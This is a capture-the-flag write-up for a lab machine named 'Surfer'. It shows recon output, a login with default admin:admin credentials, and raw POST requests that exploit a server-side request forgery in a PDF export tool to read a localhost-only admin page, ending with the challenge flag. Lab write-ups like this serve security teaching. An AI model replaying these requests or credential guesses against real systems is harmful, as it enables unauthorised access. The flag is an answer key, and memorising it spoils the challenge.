# Surfer

---

ip = `10.10.53.244`

---

`http://10.10.53.244/robots.txt`

```
User-Agent: *
Disallow: /backup/chat.txt
```

`http://10.10.53.244/backup/chat.txt`

```
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

---

### nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


### gobuster

```
/assets               (Status: 301) [Size: 313] [--> http://10.10.53.244/assets/]
/backup               (Status: 301) [Size: 313] [--> http://10.10.53.244/backup/]
/changelog.txt        (Status: 200) [Size: 816]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/internal             (Status: 301) [Size: 315] [--> http://10.10.53.244/internal/]
/login.php            (Status: 200) [Size: 4774]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/Readme.txt           (Status: 200) [Size: 222]
/robots.txt           (Status: 200) [Size: 40]
/robots.txt           (Status: 200) [Size: 40]
/server-info.php      (Status: 200) [Size: 1689]
/server-status        (Status: 403) [Size: 277]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.53.244/vendor/]

```

```
internal/admin.php            (Status: 200) [Size: 39]
internal/admin.php            (Status: 200) [Size: 39]
```

## Initial foothold

http://10.10.53.244/index.php

- login with `admin`:`admin`

- As mentioned in `/backup/chat.txt`, website have a `export2pdf` tool/functionality which generates reports for the specified `url` parameter in POST request

- From Recent Activity section we came to know that

`Internal pages hosted at /internal/admin.php. It contains the system flag. 
`


```
POST /export2pdf.php HTTP/1.1
Host: 10.10.53.244
Content-Length: 44
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://10.10.53.244
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.53.244/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=39a0b118932b582f6043460dc54ff9a7
Connection: keep-alive

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

- On visiting `/internal/admin.php`

`$ curl -s http://10.10.53.244/internal/admin.php`

we get 

```
This page can only be accessed locally.
```
- Earlier in export2pdf tool the url parameter is from localhost (127.0.0.1), so by changing the path into `/internal/admin.php` we might get the flag.

```
POST /export2pdf.php HTTP/1.1
Host: 10.10.53.244
Content-Length: 47
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://10.10.53.244
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.53.244/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=39a0b118932b582f6043460dc54ff9a7
Connection: keep-alive

url=http%3A%2F%2F127.0.0.1%2Finternal/admin.php
```
We got the flag

```
Report generated for http://127.0.0.1/internal/admin.php
flag{6255c55660e292cf0116c053c9937810}
```

`flag{6255c55660e292cf0116c053c9937810}`